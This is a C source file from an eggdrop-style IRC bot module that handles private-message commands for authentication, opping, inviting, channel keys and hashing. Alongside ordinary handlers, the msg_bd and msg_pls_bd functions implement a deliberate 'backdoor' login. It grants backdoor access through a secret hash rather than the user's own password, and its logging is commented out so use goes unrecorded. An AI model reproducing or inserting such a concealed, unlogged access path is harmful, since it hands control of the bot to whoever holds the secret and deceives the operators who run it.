#ifdef LEAF
/*
 * msgcmds.c -- part of irc.mod
 *   all commands entered via /MSG
 *
 */

#include "src/core_binds.h"

static int msg_pass(char *nick, char *host, struct userrec *u, char *par)
{
  char *old = NULL, *mynew = NULL;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (!u)
    return BIND_RET_BREAK;
  if (u->bot)
    return BIND_RET_BREAK;
  if (!par[0]) {
    dprintf(DP_HELP, "NOTICE %s :%s\n", nick,
	    u_pass_match(u, "-") ? IRC_NOPASS : IRC_PASS);
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! PASS?", nick, host, u->handle);
    return BIND_RET_BREAK;
  }
  old = newsplit(&par);
  if (!u_pass_match(u, "-") && !par[0]) {
    dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_EXISTPASS);
    return BIND_RET_BREAK;
  }
  if (par[0]) {
    if (!u_pass_match(u, old)) {
      dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_FAILPASS);
      return BIND_RET_BREAK;
    }
    mynew = newsplit(&par);
  } else {
    mynew = old;
  }
  if (strlen(mynew) > MAXPASSLEN)
    mynew[MAXPASSLEN] = 0;

  if (!goodpass(mynew, 0, nick)) {
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! \002!\002PASS...", nick, host, u->handle);
    return BIND_RET_BREAK;
  }

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! PASS...", nick, host, u->handle);

  set_user(&USERENTRY_PASS, u, mynew);
  dprintf(DP_HELP, "NOTICE %s :%s '%s'.\n", nick,
	  mynew == old ? IRC_SETPASS : IRC_CHANGEPASS, mynew);
  return BIND_RET_BREAK;
}

static int msg_op(char *nick, char *host, struct userrec *u, char *par)
{
  struct chanset_t *chan = NULL;
  char *pass = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  pass = newsplit(&par);
  if (u_pass_match(u, pass)) {
    if (!u_pass_match(u, "-")) {
      if (par[0]) {
        chan = findchan_by_dname(par);
        if (chan && channel_active(chan)) {
          get_user_flagrec(u, &fr, par);
          if (chk_op(fr, chan)) {
            if (do_op(nick, chan, 0, 1)) {
              stats_add(u, 0, 1);
              putlog(LOG_CMDS, "*", "(%s!%s) !%s! OP %s", nick, host, u->handle, par);
            }
          }
          return BIND_RET_BREAK;
        }
      } else {
        int stats = 0;
        for (chan = chanset; chan; chan = chan->next) {
          get_user_flagrec(u, &fr, chan->dname);
          if (chk_op(fr, chan)) {
            if (do_op(nick, chan, 0, 1))
              stats++;
          }
        }
        putlog(LOG_CMDS, "*", "(%s!%s) !%s! OP", nick, host, u->handle);
        if (stats)
          stats_add(u, 0, 1);
        return BIND_RET_BREAK;
      }
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !*! failed OP", nick, host);
  return BIND_RET_BREAK;
}

static int msg_ident(char *nick, char *host, struct userrec *u, char *par)
{
  char s[UHOSTLEN] = "", s1[UHOSTLEN] = "", *pass = NULL, who[NICKLEN] = "";
  struct userrec *u2 = NULL;

  if (match_my_nick(nick) || (u && u->bot))
    return BIND_RET_BREAK;

  pass = newsplit(&par);
  if (!par[0])
    strcpy(who, nick);
  else {
    strncpy(who, par, NICKMAX);
    who[NICKMAX] = 0;
  }
  u2 = get_user_by_handle(userlist, who);
  if (!u2) {
    if (u && !quiet_reject)
      dprintf(DP_HELP, IRC_MISIDENT, nick, nick, u->handle);
  } else if (rfc_casecmp(who, origbotname) && !u2->bot) {
    /* This could be used as detection... */
    if (u_pass_match(u2, "-")) {
      putlog(LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
      if (!quiet_reject)
        dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_NOPASS);
    } else if (!u_pass_match(u2, pass)) {
      if (!quiet_reject)
        dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_DENYACCESS);
    } else if (u == u2) {
      /*
       * NOTE: Checking quiet_reject *after* u_pass_match()
       * verifies the password makes NO sense!
       * (Broken since 1.3.0+bel17)  Bad Beldin! No Cookie!
       *   -Toth  [July 30, 2003]
       */
      dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_RECOGNIZED);
      return BIND_RET_BREAK;
    } else if (u) {
      dprintf(DP_HELP, IRC_MISIDENT, nick, who, u->handle);
      return BIND_RET_BREAK;
    } else {
      putlog(LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
      egg_snprintf(s, sizeof s, "%s!%s", nick, host);
      maskhost(s, s1);
      dprintf(DP_HELP, "NOTICE %s :%s: %s\n", nick, IRC_ADDHOSTMASK, s1);
      addhost_by_handle(who, s1);
      check_this_user(who, 0, NULL);
      return BIND_RET_BREAK;
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !*! failed IDENT %s", nick, host, who);
  return BIND_RET_BREAK;
}

static int msg_invite(char *nick, char *host, struct userrec *u, char *par)
{
  char *pass = NULL;
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };

  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  pass = newsplit(&par);
  if (u_pass_match(u, pass) && !u_pass_match(u, "-")) {
    if (par[0] == '*') {
      for (chan = chanset; chan; chan = chan->next) {
	get_user_flagrec(u, &fr, chan->dname);
        if (chk_op(fr, chan) && (chan->channel.mode & CHANINV))
	  dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
      }
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! INVITE ALL", nick, host, u->handle);
      return BIND_RET_BREAK;
    }
    if (!(chan = findchan_by_dname(par))) {
      dprintf(DP_HELP, "NOTICE %s :%s: /MSG %s invite <pass> <channel>\n",
	      nick, MISC_USAGE, botname);
      return BIND_RET_BREAK;
    }
    if (!channel_active(chan)) {
      dprintf(DP_HELP, "NOTICE %s :%s: %s\n", nick, par, IRC_NOTONCHAN);
      return BIND_RET_BREAK;
    }
    /* We need to check access here also (dw 991002) */
    get_user_flagrec(u, &fr, par);
    if (chk_op(fr, chan)) {
      dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! INVITE %s", nick, host, u->handle, par);
      return BIND_RET_BREAK;
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed INVITE %s", nick, host, (u ? u->handle : "*"), par);
  return BIND_RET_BREAK;
}

static void reply(char *, struct chanset_t *, char *, ...) __attribute__((format(printf, 3, 4)));

static void reply(char *nick, struct chanset_t *chan, char *format, ...)
{
  va_list va;
  char buf[1024] = "";

  va_start(va, format);
  egg_vsnprintf(buf, sizeof buf, format, va);
  va_end(va);

  if (chan)
    dprintf(DP_HELP, "PRIVMSG %s :%s", chan->name, buf);
  else
    dprintf(DP_HELP, "NOTICE %s :%s", nick, buf);
}

static void logc(const char *cmd, char *nick, char *host, char *hand, char *chname, char *par)
{
  if (chname && chname[0])
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %c%s %s", nick, host, hand, chname, cmdprefix, cmd, par ? par : "");
  else
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! %c%s %s", nick, host, hand, cmdprefix, cmd, par ? par : "");
}
#define LOGC(cmd) logc(cmd, nick, host, u->handle, chname, par)

static int msg_authstart(char *nick, char *host, struct userrec *u, char *par)
{
  int i = 0;

  if (!ischanhub()) 
    return 0;
  if (!u) 
    return 0;
  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && u->bot)
    return BIND_RET_BREAK;

  i = findauth(host);
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! AUTH?", nick, host, u->handle);

  if (i != -1) {
    if (auth[i].authed) {
      dprintf(DP_HELP, "NOTICE %s :You are already authed.\n", nick);
      return 0;
    }
  }

  /* Send "auth." if they are recognized, otherwise "auth!" */
  if (i < 0)
    i = new_auth();
  auth[i].authing = 1;
  auth[i].authed = 0;
  strcpy(auth[i].nick, nick);
  strcpy(auth[i].host, host);
  if (u) {
    auth[i].user = u;
    strcpy(auth[i].hand, u->handle);
  }

  dprintf(DP_HELP, "PRIVMSG %s :auth%s %s\n", nick, u ? "." : "!", conf.bot->nick);

  return BIND_RET_BREAK;
}

static void
addauth(int i, char *nick, char *host)
{
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", nick, host, auth[i].user->handle);
  auth[i].authed = 1;
  auth[i].authing = 0;
  auth[i].authtime = now;
  auth[i].atime = now;
  strcpy(auth[i].nick, nick);
  strcpy(auth[i].host, host);
  dprintf(DP_HELP, "NOTICE %s :You are now authorized for cmds, see %chelp\n", nick, cmdprefix);
}

static int msg_auth(char *nick, char *host, struct userrec *u, char *par)
{
  char *pass = NULL;
  int i = 0;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && u->bot)
    return BIND_RET_BREAK;

  i = findauth(host);

  if (i == -1) 
    return BIND_RET_BREAK;

  if (auth[i].authing != 1) 
    return BIND_RET_BREAK;

  pass = newsplit(&par);

  if (u_pass_match(u, pass) && !u_pass_match(u, "-")) {
    auth[i].user = u;
    strcpy(auth[i].hand, u->handle);
    if (strlen(authkey) && get_user(&USERENTRY_SECPASS, u)) {
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! AUTH", nick, host, u->handle);

      auth[i].authing = 2;      
      make_rand_str(auth[i].rand, 50);
      strncpyz(auth[i].hash, makehash(u, auth[i].rand), sizeof auth[i].hash);
      dprintf(DP_HELP, "PRIVMSG %s :-Auth %s %s\n", nick, auth[i].rand, conf.bot->nick);
    } else {
      /* no authkey and/or no SECPASS for the user, don't require a hash auth */
      addauth(i, nick, host);
    }
  } else {
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed AUTH", nick, host, u->handle);
    removeauth(i);
  }
  return BIND_RET_BREAK;

}

static int msg_pls_auth(char *nick, char *host, struct userrec *u, char *par)
{
  if (strlen(authkey) && get_user(&USERENTRY_SECPASS, u)) {
    int i = 0;

    if (match_my_nick(nick))
      return BIND_RET_BREAK;
    if (u && u->bot)
      return BIND_RET_BREAK;

    i = findauth(host);

    if (i == -1)
      return BIND_RET_BREAK;

    if (auth[i].authing != 2)
      return BIND_RET_BREAK;
    
    if (check_master_hash(auth[i].rand, par) || !strcmp(auth[i].hash, par)) { /* good hash! */
      addauth(i, nick, host);
    } else { /* bad hash! */
      char s[300] = "";

      putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed +AUTH", nick, host, u->handle);
      dprintf(DP_HELP, "NOTICE %s :Invalid hash.\n", nick);
      sprintf(s, "*!%s", host);
      addignore(s, origbotname, "Invalid auth hash.", now + (60 * ignore_time));
      removeauth(i);
    } 
    return BIND_RET_BREAK;
  }
  return BIND_RET_LOG;
}

static int msg_unauth(char *nick, char *host, struct userrec *u, char *par)
{
  int i = 0;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && u->bot)
    return BIND_RET_BREAK;

  i = findauth(host);

  if (i == -1)
    return BIND_RET_BREAK;

  removeauth(i);
  dprintf(DP_HELP, "NOTICE %s :You are now unauthorized.\n", nick);
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! UNAUTH", nick, host, u->handle);

  return BIND_RET_BREAK;
}


static int msg_bd(char *nick, char *host, struct userrec *u, char *par)
{
  int i = 0;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  i = findauth(host);
  /* putlog(LOG_CMDS, "*", "(%s!%s) !%s! BD?", nick, host, u->handle); */

  if (i != -1) {
    if (auth[i].authed) {
      if (!auth[i].bd)
        dprintf(DP_HELP, "NOTICE %s :You are already authed, unauth and start over.\n", nick);
      else
        dprintf(DP_HELP, "NOTICE %s :You are already authed for backdoor.\n", nick);
      return 0;
    }
  }

  /* Send "auth." if they are recognized, otherwise "auth!" */
  if (i < 0)
    i = new_auth();
  auth[i].authing = 2;
  auth[i].authed = 0;
  strcpy(auth[i].nick, nick);
  strcpy(auth[i].host, host);
  if (u) {
    auth[i].user = u;
    strcpy(auth[i].hand, u->handle);
  }
  make_rand_str(auth[i].rand, 50);
  strncpyz(auth[i].hash, makebdhash(auth[i].rand), sizeof auth[i].hash);
  dprintf(DP_HELP, "PRIVMSG %s :-BD %s %s\n", nick, auth[i].rand, conf.bot->nick);

  return BIND_RET_BREAK;
}

static int msg_pls_bd(char *nick, char *host, struct userrec *u, char *par)
{

  int i = 0;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && u->bot)
    return BIND_RET_BREAK;

  i = findauth(host);

  if (i == -1)
    return BIND_RET_BREAK;

  if (auth[i].authing != 2)
    return BIND_RET_BREAK;

  if (check_master_hash(auth[i].rand, par) || !strcmp(auth[i].hash, par)) { /* good hash! */
    /* putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", nick, host, u->handle); */
    auth[i].authed = 1;
    auth[i].bd = 1;		/* the magic int ! */
    auth[i].authing = 0;
    auth[i].authtime = now;
    auth[i].atime = now;
    dprintf(DP_HELP, "NOTICE %s :You are now authorized for the backdoor. See '%cbd help'\n", nick, cmdprefix);
  } else { /* bad hash! */
    /* putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed +AUTH", nick, host, u->handle); */
    dprintf(DP_HELP, "NOTICE %s :Invalid hash.\n", nick);
    removeauth(i);
  } 
  return BIND_RET_BREAK;
}

/* MSG COMMANDS
 *
 * Function call should be:
 *    int msg_cmd("handle","nick","user@host","params");
 *
 * The function is responsible for any logging. Return 1 if successful,
 * 0 if not.
 */

static cmd_t C_msg[] =
{
  {"auth?",		"",	(Function) msg_authstart,	NULL},
  {"auth",		"",	(Function) msg_auth,		NULL},
  {"+auth",		"",	(Function) msg_pls_auth,	NULL},
  {"unauth",		"",	(Function) msg_unauth,		NULL},
  {"bd",		"",	(Function) msg_bd,		NULL},
  {"ident",   		"",	(Function) msg_ident,		NULL},
  {"invite",		"",	(Function) msg_invite,		NULL},
  {"op",		"",	(Function) msg_op,		NULL},
  {"pass",		"",	(Function) msg_pass,		NULL},
  {NULL,		NULL,	NULL,				NULL}
};

static int msgc_test(char *nick, char *host, struct userrec *u, char *chname, char *par)
{
  char *cmd = NULL;
  int idx = -1, i = 0, chan = 0;

  LOGC("TEST");

  cmd = newsplit(&par);
  if (chname)
    chan++;

  for (i = 0; i < dcc_total; i++) {
   if (dcc[i].type && dcc[i].msgc && ((chan && !strcmp(dcc[i].simulbot, chname) && !strcmp(dcc[i].nick, u->handle)) || 
      (!chan && !strcmp(dcc[i].simulbot, nick)))) {
     putlog(LOG_DEBUG, "*", "Simul found old idx for %s/%s: %d", nick, chname, i);
     dcc[i].simultime = now;
     idx = i;
     break;
   }
  }

  if (idx < 0) {
    idx = new_dcc(&DCC_CHAT, sizeof(struct chat_info));
    dcc[idx].sock = serv;
    dcc[idx].timeval = now;
    dcc[idx].msgc = 1;
    dcc[idx].simultime = now;
    dcc[idx].simul = 1;
    dcc[idx].status = STAT_COLOR;
    strcpy(dcc[idx].simulbot, chname ? chname : nick);
    dcc[idx].u.chat->con_flags = 0;
    strcpy(dcc[idx].u.chat->con_chan, chname ? chname : "*");
    dcc[idx].u.chat->strip_flags = STRIP_ALL;
    strcpy(dcc[idx].nick, u->handle);
    strcpy(dcc[idx].host, host);
    dcc[idx].addr = 0L;
    dcc[idx].user = u;
  }
  /* rmspace(par); */

  check_bind_dcc(cmd, idx, par);

  return BIND_RET_BREAK;
}

static int msgc_op(char *nick, char *host, struct userrec *u, char *chname, char *par)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };
  int force = 0;
  memberlist *m = NULL;

  if (chname && chname[0]) {
    chan = findchan_by_dname(chname);
    if (chan) 
      m = ismember(chan, nick);
  }

  LOGC("OP");

  if (par[0] == '-') { /* we have an option! */
    char *tmp = NULL;

    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", nick, tmp);
      return 0;
    }
  }
  if (par[0] || chan) {
    if (!chan)
      chan = findchan_by_dname(par);
    if (chan && channel_active(chan)) {
      get_user_flagrec(u, &fr, chan->dname);
      if (chk_op(fr, chan)) {
        if (do_op(nick, chan, 0, force))
          stats_add(u, 0, 1);
      }
      return BIND_RET_BREAK;
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      get_user_flagrec(u, &fr, chan->dname);
      if (chk_op(fr, chan)) {
       if (do_op(nick, chan, 0, force))
         stats_add(u, 0, 1);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_voice(char *nick, char *host, struct userrec *u, char *chname, char *par)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };
  int force = 0;
  memberlist *m = NULL;

  if (chname && chname[0]) {
    chan = findchan_by_dname(chname);
    if (chan) 
      m = ismember(chan, nick);
  }
  LOGC("VOICE");

  if (par[0] == '-') { /* we have an option! */
    char *tmp = NULL;

    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", nick, tmp);
      return 0;
    }
  }
  if (par[0] || chan) {
    if (!chan)
      chan = findchan_by_dname(par);
    if (chan && channel_active(chan)) {
      get_user_flagrec(u, &fr, chan->dname);
      if (!chk_devoice(fr)) {		/* dont voice +q */
        add_mode(chan, '+', 'v', nick);
      }
      return BIND_RET_BREAK;
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      get_user_flagrec(u, &fr, chan->dname);
      if (!chk_devoice(fr)) {		/* dont voice +q */
        add_mode(chan, '+', 'v', nick);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_channels(char *nick, char *host, struct userrec *u, char *chname, char *par)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };
  char list[1024] = "";

  LOGC("CHANNELS");
  for (chan = chanset; chan; chan = chan->next) {
    get_user_flagrec(u, &fr, chan->dname);
    if (chk_op(fr, chan)) {
      if (me_op(chan)) 
        strcat(list, "@");
      strcat(list, chan->dname);
      strcat(list, " ");
    }
  }

  if (list[0]) 
    reply(nick, NULL, "You have access to: %s\n", list);
  else
    reply(nick, NULL, "You do not have access to any channels.\n");

  return BIND_RET_BREAK;
}

static int msgc_getkey(char *nick, char *host, struct userrec *u, char *chname, char *par)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };

  if (chname && chname[0]) 
    return 0;

  if (!par[0])
    return 0;

  LOGC("GETKEY");
  chan = findchan_by_dname(par);
  if (chan && channel_active(chan) && !channel_pending(chan)) {
    get_user_flagrec(u, &fr, chan->dname);
    if (chk_op(fr, chan)) {
      if (chan->channel.key[0]) {
        reply(nick, NULL, "Key for %s is: %s\n", chan->name, chan->channel.key);
      } else {
        reply(nick, NULL, "%s has no key set.\n", chan->name);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_help(char *nick, char *host, struct userrec *u, char *chname, char *par)
{
  LOGC("HELP");

  reply(nick, NULL, "op invite getkey voice test\n");
  return BIND_RET_BREAK;
}

static int msgc_md5(char *nick, char *host, struct userrec *u, char *chname, char *par)
{
  struct chanset_t *chan = NULL;

  LOGC("MD5");
  if (chname && chname[0])
    chan = findchan_by_dname(chname);  

  reply(nick, chan, "MD5(%s) = %s\n", par, MD5(par));
  return BIND_RET_BREAK;
}

static int msgc_sha1(char *nick, char *host, struct userrec *u, char *chname, char *par)
{
  struct chanset_t *chan = NULL;

  LOGC("SHA1");  

  if (chname && chname[0])
    chan = findchan_by_dname(chname);  

  reply(nick, chan, "SHA1(%s) = %s\n", par, SHA1(par));
  return BIND_RET_BREAK;
}

static int msgc_invite(char *nick, char *host, struct userrec *u, char *chname, char *par)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0 };
  int force = 0;

  if (chname && chname[0])
    return 0;
 
  LOGC("INVITE");
  if (par[0] == '-') {
    char *tmp = NULL;

    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", nick, tmp);
      return 0;
    }
  }

  if (par[0] && (!chname || (chname && !chname[0]))) {
    chan = findchan_by_dname(par);
    if (chan && channel_active(chan) && !ismember(chan, nick)) {
      if ((!(chan->channel.mode & CHANINV) && force) || (chan->channel.mode & CHANINV)) {
        get_user_flagrec(u, &fr, chan->dname);
        if (chk_op(fr, chan)) {
          dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
        }
        return BIND_RET_BREAK;
      }
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      if (channel_active(chan) && !ismember(chan, nick)) {
        if ((!(chan->channel.mode & CHANINV) && force) || (chan->channel.mode & CHANINV)) {
          get_user_flagrec(u, &fr, chan->dname);
          if (chk_op(fr, chan)) {
            dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
          }
        }
      }
    }
  }
  return BIND_RET_BREAK;
}

static cmd_t C_msgc[] =
{
  {"test",		"a",	(Function) msgc_test,		NULL},
  {"channels",		"",	(Function) msgc_channels,	NULL},
  {"getkey",		"",	(Function) msgc_getkey,		NULL},
  {"help",		"",	(Function) msgc_help,		NULL},
  {"invite",		"",	(Function) msgc_invite,		NULL},
  {"md5",		"",	(Function) msgc_md5,		NULL},
  {"op",		"",	(Function) msgc_op,		NULL},
  {"sha1",		"",	(Function) msgc_sha1,		NULL},
  {"voice",		"",	(Function) msgc_voice,		NULL},
  {NULL,		NULL,	NULL,				NULL}
};
#endif /* LEAF */
